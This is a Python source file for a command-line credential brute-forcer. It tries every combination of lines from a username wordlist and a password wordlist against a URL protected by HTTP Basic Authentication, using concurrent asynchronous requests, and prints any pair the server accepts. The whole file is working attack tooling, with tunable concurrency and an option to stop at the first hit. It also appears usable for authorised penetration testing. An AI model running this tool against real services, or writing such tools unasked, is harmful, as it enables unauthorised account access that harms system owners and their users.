import asyncio
import sys
from collections.abc import AsyncIterator
from pathlib import Path

import aiofiles
import attr
import httpx
import typer
from tqdm import tqdm

from brute import log


@attr.s(frozen=True, order=False, auto_attribs=True, kw_only=True)
class CredPair:
    username: str
    password: str


async def get(
    cred_pair: CredPair,
    request: httpx.Request,
    client: httpx.AsyncClient,
    pbar: tqdm,
) -> bool:
    """
    Return True if the request against URL with the credentials in cred_pair has a
    status code of < 400.

    Retry the request if an httpx.ReadTimeout exception is raised.
    """

    while True:
        try:
            response = await client.send(
                request, auth=(cred_pair.username, cred_pair.password)
            )
            return response.status_code < 400
        except httpx.ReadTimeout:
            # just log and try again? maybe do some kind of congestion control later
            await log.warn(
                f"Retrying because read timeout for request {request} and {cred_pair}",
                pbar=pbar,
            )


async def iterlines(path: Path) -> AsyncIterator[str]:
    """
    Yield non-empty lines (stripped of newline char) from a file
    """
    try:
        async with aiofiles.open(path) as f:
            async for line in f:
                if len(line) >= 2:  # we know there's a \n and some data
                    yield line[:-1]
    except FileNotFoundError:
        raise ValueError(f"Path {path} is not a readable file")


async def consumer(
    queue: asyncio.Queue[CredPair],
    pbar: tqdm,
    url: str,
    stop_on_found: bool,
    stop_event: asyncio.Event,
    found_event: asyncio.Event,
) -> None:
    """
    Get username:password pairs from the queue and try them against the url.

    If one is successful, set the found_event and, if stop_on_found is True, also set
    the stop_event.
    """
    await log.debug("Starting HTTP request worker...", pbar=pbar)

    async with httpx.AsyncClient() as client:
        request = client.build_request("GET", url)

        while True:
            cred_pair = await queue.get()

            result = await get(
                cred_pair=cred_pair,
                request=request,
                client=client,
                pbar=pbar,
            )

            queue.task_done()
            pbar.set_postfix_str(
                (
                    f"username={cred_pair.username[:10]: <10}, "
                    f"password={cred_pair.password[:10]: <10}"
                ),
                refresh=False,
            )
            pbar.update()

            if result:
                await log.info("Found working credentials 😀", pbar=pbar)
                pbar.write(
                    f'username="{cred_pair.username}", password="{cred_pair.password}"'
                )
                found_event.set()
                if stop_on_found:
                    stop_event.set()


async def producer(
    username_path: Path,
    password_path: Path,
    queue: asyncio.Queue[CredPair],
    stop_event: asyncio.Event,
    pbar: tqdm,
) -> None:
    """
    Populate the queue with username:password pairs and wait for the queue to be
    emptied. On empty, set the stop_event.
    """
    await log.debug("Starting file read worker...", pbar=pbar)

    async for username in iterlines(username_path):
        async for password in iterlines(password_path):
            cp = CredPair(username=username, password=password)
            await queue.put(cp)

    await queue.join()

    stop_event.set()


async def lines_in_file(path: Path) -> int:
    count = 0
    async with aiofiles.open(path) as f:
        async for _ in f:
            count += 1
    return count


async def credential_pair_counter(
    username_path: Path,
    password_path: Path,
    pbar: tqdm,
) -> None:
    """
    Figure out how many credential pairs there are in the username and password files
    and update the progress bar with that number.
    """
    await log.debug("Starting credential pair counter...", pbar=pbar)

    username_count = await lines_in_file(username_path)
    password_count = await lines_in_file(password_path)

    pbar.total = username_count * password_count

    await log.debug(
        "Total credential pairs counted, progress bar now displaying.", pbar=pbar
    )


async def process_all(
    url: str,
    username_path: Path,
    password_path: Path,
    queue_maxsize: int,
    consumer_count: int,
    stop_on_found: bool,
) -> bool:
    """
    Start tasks that read from the username and password paths and run GET requests
    to try them out.
    """
    queue: asyncio.Queue[CredPair] = asyncio.Queue(maxsize=queue_maxsize)
    pbar = tqdm(unit=" requests")

    stop_event = asyncio.Event()
    found_event = asyncio.Event()

    all_tasks = set()

    for i in range(consumer_count):
        consumer_task = asyncio.create_task(
            consumer(
                queue=queue,
                pbar=pbar,
                url=url,
                stop_on_found=stop_on_found,
                stop_event=stop_event,
                found_event=found_event,
            ),
            name=f"consumer-{i}",
        )
        all_tasks.add(consumer_task)

    producer_task = asyncio.create_task(
        producer(
            username_path=username_path,
            password_path=password_path,
            queue=queue,
            stop_event=stop_event,
            pbar=pbar,
        ),
        name="producer",
    )
    all_tasks.add(producer_task)

    counter_task = asyncio.create_task(
        credential_pair_counter(
            username_path=username_path,
            password_path=password_path,
            pbar=pbar,
        ),
        name="counter",
    )
    all_tasks.add(counter_task)

    # by only waiting on the event, any task exceptions thrown won't bubble.
    # TODO: fix this later, somehow. i want to see exceptions.
    await stop_event.wait()

    pbar.clear()
    pbar.close()

    for task in all_tasks:
        if not task.done():
            task.cancel()

    await asyncio.gather(*all_tasks, return_exceptions=True)

    if not found_event.is_set():
        await log.info("Could not find working credentials 😢", pbar=pbar)
        return False

    return True


def main(
    url: str,
    username_path: Path,
    password_path: Path,
    queue_maxsize: int = typer.Option(
        default=10_000,
        help=(
            "Maximum username/password pairs to keep in memory. Setting too low will "
            "reduce performance, while too high might fill up all your RAM."
        ),
    ),
    requestor_count: int = typer.Option(
        default=3,
        help=(
            "Number of concurrent requestors to run asynchronously. Setting too low "
            "will reduce performance, while too high will cause requestor starvation."
        ),
    ),
    stop_on_found: bool = typer.Option(
        default=True, help="Stop after finding the first working credential."
    ),
    asyncio_debug: bool = typer.Option(
        default=False,
        help="Turn on asyncio debugging.",
    ),
) -> int:
    """
    Make http requests against URL that has basic authentication. The usernames and
    passwords provided are the cartesian product of the lines in files at USERNAME_PATH
    and PASSWORD_PATH.

    Credential pairs that yield responses with status codes < 400 are considered working
    and will be printed to stdout.

    Returns with an exit code of 0 if a working credential pair was found and 1 if not.
    """
    found = asyncio.run(
        process_all(
            url=url,
            username_path=username_path,
            password_path=password_path,
            queue_maxsize=queue_maxsize,
            consumer_count=requestor_count,
            stop_on_found=stop_on_found,
        ),
        debug=asyncio_debug,
    )

    if found:
        sys.exit(0)

    sys.exit(1)


if __name__ == "__main__":
    typer.run(main)
